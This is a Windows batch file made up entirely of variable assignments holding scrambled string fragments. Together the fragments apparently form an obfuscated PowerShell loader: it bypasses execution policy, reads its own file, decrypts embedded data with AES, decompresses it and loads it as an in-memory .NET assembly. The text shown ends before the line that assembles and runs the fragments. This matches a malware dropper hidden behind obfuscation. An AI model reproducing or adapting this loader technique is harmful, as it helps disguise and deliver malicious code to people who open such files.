@echo off
set "orEIMQMHqk=do"
set "JAEvaAHuHa=in"
set "KBXIFSVplO=st"
set "qOYyDLraZC=0\"
set "IQUbrxQhPw=ll"
set "BFZUCxRrxw=.e"
set "OuTeAVeiXd=co"
set "KTXQJgkMaf=we"
set "NbwEnRqspR=Po"
set "snmZCiKYYc=nd"
set "toxkgFQPkI=s\"
set "LaUGmpgjHJ=ws"
set "sUOqsvgVvE=32"
set "uxMYmnUZuV=he"
set "ltjExqZoic=1."
set "BmNzZTkikc=py"
set "fJyvCJGXjK=rS"
set "VhGijHHiuh=po"
set "WGBEqhChWl=y "
set "BMPEDeCbcD=\v"
set "MCczIeNbvQ=he"
set "FGKUgyBbex= C"
set "TrhCuiQxiF=xe"
set "IiqBBeQbSW=em"
set "JYVjeftxEf=Sy"
set "tirkwjEoXn= /"
set "uceAJVPGmE=ow"
set "ayqoKNNqbS=rs"
set "OMnvplOtud=we"
set "ztryvZNzrb=ll"
set "VaPVKxPDfU=Wi"
set "CsbhTSqOFo=\W"
set "tGwhnuAWKZ=:\"
set "TGDWGwcotR= %~dp0"
set "RbQfOWCsTF=cd"
set "kkxBlQblBg=);$C"
set "PSHKfwWhEP=yste"
set "MSljCaKZtN=Sa.T"
set "qIiyhrjJCm=.Dis"
set "QvVngJshbI=);$O"
set "DGjIqaLnmC=cBP "
set "yMeLwEKJlX=-4] "
set "vczPtXGYdF=[Env"
set "nEiUdqZyDy=ion."
set "PPhTuVrbHY=$mku"
set "tHqJZGjxKl=v4Ir"
set "yJtYbvXGQa=y]::"
set "PZpuQKukwh=New-"
set "VnrOGMSMqU=;$bE"
set "LcZlOQJmkI=sGUc"
set "iswkcuTsJm=th('"
set "pduQpTYNxC=pres"
set "YUwhkCdYQA=-ep "
set "AsVQcgaYtg=:: '"
set "TDGzcvClNg== [S"
set "eqOIDznJZi=Secu"
set "dmrihyYdsk=.Con"
set "kCezzfNhYg=.IO."
set "WfmlIaSDEF=g = "
set "nypUWcvqQG=ct S"
set "CLppJByIDM=[-1."
set "VpJUceYYuU= = N"
set "lsAuciahNe=k; }"
set "RPJFAsccKC=1] -"
set "zJFOlUkiMv=c = "
set "YDIuWGUmwy=();$"
set "ePgDEbvHUw=Disp"
set "miBveLOFZr=ress"
set "zqvJdTQiRa=tJgQ"
set "XOOkudWQGi=ose("
set "FKKGORNGGy= [Sy"
set "nzYWVnrEtN=kufc"
set "mpDDDYIyoC=oint"
set "cwwjmtDLIX= = $"
set "nZwTZXSQcN=-Obj"
set "yBDUUdrujO=Disp"
set "lkomkigVRA=OtJg"
set "vOCQhAlzuW=('%*'"
set "TKowYgMxiq=rtS4"
set "GHnRRzvpAx=ss -"
set "ZIFCdnJPKn=rity"
set "uhloEGlvYK=[Sys"
set "aekRrySKum=eam("
set "mCVRnHuAbv=in $"
set "xxJcpUuLEz=ZYYc"
set "iTwIbAevei=('%~f0'"
set "vHHODyzLrU=ke($"
set "kQdyIXWnoC=ionM"
set "fgvAEBgvvV=$Pdz"
set "HxADWNuOwM=tion"
set "bBHFWHuUdO=($FL"
set "qStTxfKPIh=;$Cw"
set "QNVaGTWoCU=oin "
set "eAnBDIubPr=)) {"
set "XlLuZpnOIE=gQ.I"
set "HmerczqDQj=gth)"
set "AJRvidKtEK=$aiN"
set "tyndDLANZP=$bEg"
set "koZRsyCmKN=c, 0"
set "GxiUxMEWdx=ewLi"
set "gRglgvWywh=mkuf"
set "EAVIiRljib=Q.Pa"
set "qkaUWHeVGt= = $"
set "pxFLNoinNe=)($m"
set "pihVvGeHHw=ecry"
set "YcZWfcigHb=pher"
set "VZvEheSWPz=esaB"
set "TYKXiKZocK=File"
set "SlLwtFuFoI=yste"
set "osnxezmTqJ=16] "
set "wuMLTsDbsg=.Cop"
set "kNWZuuPCEY=.GZi"
set "RYYeqXEjQK=ispo"
set "cLvoYmGhZK=.Mem"
set "sqFdLHiDIg=();$"
set "loiJcrgIfg=ring"
set "lXmxmPXZCV= '')"
set "tPvpuOqZEE=1..-"
set "wxNHuZHRZn=ct S"
set "uNOiGbwBnM=.-16"
set "sbhwrxrqdf=.Sec"
set "PLUXrhsOkJ=trea"
set "YyhrTgnEFW=]::("
set "eZBdAPKmoK=ress"
set "xQhRUbhmct=Secu"
set "xJZFggVfIv= = ["
set "SxkMOaPHGD=m.Re"
set "vkXdrygTGa=oryS"
set "QxmooGALjH=lV);"
set "KtOuJccXqh=New-"
set "KAkuUKdQhi=ddin"
set "CHKSkpbNGe=n ''"
set "yhBexniqPP=('l0"
set "lhXiCbxqFQ=  $A"
set "opnwKRiukG=comm"
set "aYleBHIiRk=ptog"
set "nRwmTLZUrA=tem."
set "WArLqLYhdZ=gSa "
set "qSFOaNOnoR=tryP"
set "SnGGhHztqS=daeR"
set "eTtIDDFzQl=, $m"
set "FgYnJnzYLr=Syst"
set "nQpQKiWDZe=] -j"
set "oXOteEnlos=tJgQ"
set "ejeXjtsCzp='gni"
set "YACpgOjOcs=)($A"
set "EOKRjvsULc=.Ass"
set "SRaXIDnAZs=C) {"
set "vQyerpXvmj=yTo("
set "hhmrFqEIJC= '')"
set "SORLVQOhGb=e]::"
set "OGLVHVzbam=fore"
set "XvAAsJnCMw=[Sys"
set "yRJSEZRfqe=am;$"
set "gXTWqtktOx=gSa."
set "hkgyHMmQPn=gnir"
set "BeSYKfenHv=tJgQ"
set "LFCujXkrKN=rofi"
set "CuymoiXoPw=comp"
set "WHUvyrCgzT=Conv"
set "InGlhaaufP=();$"
set "OswJOKYFgc=ose("
set "xQrodQZwQs=ert]"
set "zFAGLnJSHr=morF"
set "DgUOgwtBql=:('g"
set "xcIlktcFMi=S46e"
set "JieNNKhTcj=.Cre"
set "KMwMgCdJZp=pDZz"
set "dSPXGZRWFS=::('"
set "ZfkPrYtYAb=deO "
set "cFLGVeIarX=.Cry"
set "nzyQoYzsqu=; };"
set "sJluMZTFeH=mkuf"
set "PVmhvMdJKx=7Yiv"
set "OVklwWCsHS=esFX"
set "FIISjqvXYw='txe"
set "BpSesEeaob=6esa"
set "VlSDCthojI=-nop"
set "BedbgxeVSv=mory"
set "jpcJHtNcgl=ew-O"
set "vavVIaxJTB=aiNY"
set "yFwUlbUHev=bypa"
set "cBsxevHbNY=form"
set "bquJgNmIgq=kbXS"
set "VSmHoGxVdd=Fo7l"
set "efWfnifHVM=tS46"
set "gWmoEBKWRm=ieZV"
set "NCuOsYPavZ=iron"
set "hNytlirakt=VC ="
set "EBYAUegOfq=gMod"
set "USWqRGKyTm=$Pta"
set "lSivWQeygL=ect "
set "tuOStLpdVe=;$bE"
set "tLArGjiZmi=ment"
set "WLrVzlcirq=stem"
set "ymaDiMsSpj=join"
set "NrCqICSwwb=pStr"
set "gpfZxLfTrA=m.IO"
set "zixmMPKaPf=);$P"
set "AAYymSCIrs=stem"
set "yVFbpsfcTE=y.Cr"
set "eALZZcrnOn=em.I"
set "pOaFAlqSOS='[-1"
set "inhlcmvlzk=).Sp"
set "eCQtrJChik=ne);"
set "jJrkDLeOPE=$mku"
set "vtHBHvYiar=n ''"
set "FmVPevcIbd=($FL"
set "kwMEfrGFqK=$ieZ"
set "TWGQBqLWgV=3HWs"
set "loTYtdfFgP=.Key"
set "ehYsXjGOKh=UGTu"
set "pcqGdmyGXH=..-1"
set "wNVhMDvdKE=V = "
set "fhGWAkwCaV==');"
set "dxYtQXxwYa=bjec"
set "FmElvnLNoz=saBm"
set "KQfxYmVkKw=tem."
set "XBJmQeGRuJ=ing("
set "FUJyWGRNBM=isfL"
set "TmAjolYVrb=and "
set "cBvstfGwPA=PKCS"
set "amZjJMSpVY=oL'["
set "gNYPkWhLpp=O.Me"
set "skuzynZLCt=y.Ci"
set "QqzjiBTLPk=rity"
set "gaxYCSTNJA=ay()"
set "QvPCdfeRaM=le  "
set "qMPIKWticC=Invo"
set "cYFgDEUOWT=null"
set "XwvtcYhgfz=l = "
set "mciAvyrcfo=rans"
set "YxWZCUvlWl=tem."
set "mWMGBegWrT=O.En"
set "XOloLkIoKP=;$KD"
set "jwiqsVDFUU=ach "
set "WulhUlNDTZ=.Mod"
set "pPwaJvCYjK=cBP."
set "IYeOuOLYBU=+hAO"
set "QcGfgSXzWB=join"
set "zEddOzZKwL=vert"
set "PmlFINVqdz=se()"
set "evizPiknCA=oc, "
set "JaqyoVSUsZ=em.C"
set "vqnvKfxKEu== $O"
set "lSEJBXAhgK=c = "
set "XPJLabhdmU=bstr"
set "DiGCoXWKKx='[-1"
set "JKtDjUqSzL=P.Su"
set "JbbXzLvzFA='dqR"
set "PqZxnUuMQN=-1.."
set "KFMzjUKMPJ=);$O"
set "EmmrLrQxWR=fc);"
set "YkRwoAdfmg=.Cry"
set "ltxvgpAgUu=Bmor"
set "JYaKvuVSwe=t Sy"
set "hCgnrzbEnE=BC;$"
set "WOAvyeyVom=fc ="
set "kgQPNesIVn=]::C"
set "rODMwLSyNy=Obje"
set "bNhNlZEaCw=lV ="
set "HYewMBPaqB=TllA"
set "GhrEIkubQl=d;$O"
set "XxQvJHHyfA=[Sys"
set "spwyjrxrLD=esMa"
set "bjjexzEhMy=y.Pa"
set "FYENZlNKjI=Obje"
set "gxlgSojLsN=F'[-"
set "bEmiEmMyCZ=[]] "
set "oZKwvTCmtL=lit("
set "CaAsGuqWox=raph"
set "PLBnSimwgO=Pdzo"
set "MQVAbDLKkk=Syst"
set "QnrchawAaw=ddin"
set "lDcKjGPZgt=]::("
set "GmmMVZRItQ=m.IO"
set "iPgXWfCfHW=[IO."
set "naNIaZDEqa=nirt"
set "XaBlPCKNfl=zoc."
set "uxHKMkzOeg=ck($"
set "tYyWBFmUiG=raph"
set "wZpruGRxLb=3); "
set "ezHvDSzOxz=OyzA"
set "kyFsVwbzhI===')"
set "xMLmCUAFdn=$Pta"
set "cFOrytLXKo=grap"
set "qlwVwliRqZ=brea"
set "pogemgCpKM=orF'"
set "HxyohuJCiX=ode]"
set "DXchHqWTQK=wxch"
set "PdjBfCAXyl='')("
set "FVEkHYYdPZ=embl"
set "ghXyNCUuIK=0O+g"
set "DFoETeaezW=KDde"
set "zMElcalDYX=sion"
set "yUmIGthLlp=flec"
set "LQBWPBapQr=stem"
set "TOAzkextLT=m(, "
set "exnlxTTbSy=$OtJ"
set "PqgmfGCjNT= New"
set "sPbwGcwGgq=tJgQ"
set "TjyVanYmaZ=iNYl"
